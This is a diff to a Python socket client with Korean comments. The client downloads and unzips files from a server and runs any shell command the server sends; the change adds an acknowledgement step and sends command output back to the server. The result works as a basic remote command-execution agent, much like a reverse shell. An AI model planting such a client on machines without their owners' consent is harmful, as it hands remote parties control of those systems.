@@ -2,6 +2,7 @@ import socket
 import zipfile
 import os
 import subprocess  # 명령어 실행을 위한 모듈
+import time
 
 def receive_file(client_socket, save_path, file_size):
     """서버에서 파일을 수신하여 지정된 경로에 저장"""
@@ -69,6 +70,8 @@ def start_client():
                     file_size = int(parts[1])  # 파일 크기
 
                 if data == "FILE_TRANSFER":
+                    client_socket.sendall(b"OK")
+                    time.sleep(1)
                     # 파일 전송 모드로 전환
                     receive_file(client_socket, save_path, file_size)
                     unzip_file(save_path, extract_to)
@@ -79,7 +82,15 @@ def start_client():
                     exec_command = command.split("EXECUTE ", 1)[1]
                     print(f"Executing command: {exec_command}")
                     output = execute_command(exec_command)
-                    # 명령 결과는 서버에 전송하지 않음
+                    # 명령어 결과 전송
+                    if output:
+                        # 데이터 크기 전송
+                        data = output.encode('utf-8')
+                        client_socket.sendall(str(len(data)).encode('utf-8'))  # 데이터 길이를 먼저 전송
+                        client_socket.recv(1)  # 서버로부터 수신 확인
+                        client_socket.sendall(data)  # 실제 데이터 전송
+                    else:
+                        client_socket.sendall(b"0")  # 데이터 크기 0 전송
 
                 elif command == "SERVER_SHUTDOWN":
                     print("Server is shutting down. Closing connection.")
